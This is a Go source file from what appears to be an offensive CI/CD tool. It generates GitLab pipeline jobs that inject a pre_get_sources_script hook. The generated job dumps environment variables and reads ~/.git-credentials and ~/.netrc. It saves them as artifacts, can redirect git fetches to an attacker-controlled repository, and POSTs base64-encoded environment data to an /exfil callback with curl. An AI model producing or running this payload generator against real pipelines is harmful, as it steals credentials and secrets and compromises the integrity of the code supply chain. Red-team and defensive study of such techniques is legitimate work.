package payloads

import (
	"fmt"
	"strings"
)

// PreGetSourcesOptions configures a pre_get_sources_script injection payload.
type PreGetSourcesOptions struct {
	Common       CommonOptions
	HookScript   string // custom hook content (default: env dump + credential sweep)
	CallbackURL  string // HTTP callback for exfiltration
	ModifyGitURL string // redirect git fetch to attacker-controlled repo
}

// GeneratePreGetSourcesYAML generates a CI job that injects a
// hooks:pre_get_sources_script to execute code before Git fetches sources.
func GeneratePreGetSourcesYAML(o PreGetSourcesOptions) string {
	name, stage := o.Common.defaults("pre-get-sources")
	script := buildPreGetSourcesScript(o)

	return fmt.Sprintf(`stages: [%s]

%s:
  stage: %s%s%s
  hooks:
    pre_get_sources_script:
      - |
%s
  script:
    - |
      # Harvest credentials captured during pre-source hook phase
      cat /proc/self/environ 2>/dev/null | tr '\0' '\n' | sort > .pre-source-env.log || true
      cp ~/.git-credentials .git-creds.bak 2>/dev/null || true
      cp ~/.netrc .netrc.bak 2>/dev/null || true
  artifacts:
    when: always
    paths:
      - .pre-source-env.log
      - .git-creds.bak
      - .netrc.bak
    expire_in: 1 day
  allow_failure: true%s
`, stage, name, stage, imageLine(o.Common.Image), tagsLine(o.Common.Tags),
		indentBlock(strings.TrimSpace(script), 8),
		rulesManual(o.Common.Manual))
}

func buildPreGetSourcesScript(o PreGetSourcesOptions) string {
	if strings.TrimSpace(o.HookScript) != "" {
		return o.HookScript
	}

	var b strings.Builder

	b.WriteString(`_HOOK() {
  # Runs BEFORE git fetches sources — credentials are live
  git config --global --list 2>/dev/null || true
  cat ~/.git-credentials 2>/dev/null || true
  cat ~/.netrc 2>/dev/null || true
`)

	if strings.TrimSpace(o.ModifyGitURL) != "" {
		fmt.Fprintf(&b, `
  # Redirect git fetch to attacker-controlled repository
  git config --global url."%s".insteadOf "$CI_REPOSITORY_URL" || true
`, o.ModifyGitURL)
	}

	if strings.TrimSpace(o.CallbackURL) != "" {
		fmt.Fprintf(&b, `
  curl -sS -X POST -F "project=$CI_PROJECT_PATH" -F "env=$(printenv | base64 -w0)" "%s/exfil" || true
`, o.CallbackURL)
	}

	b.WriteString(`}
_HOOK || true`)

	return b.String()
}
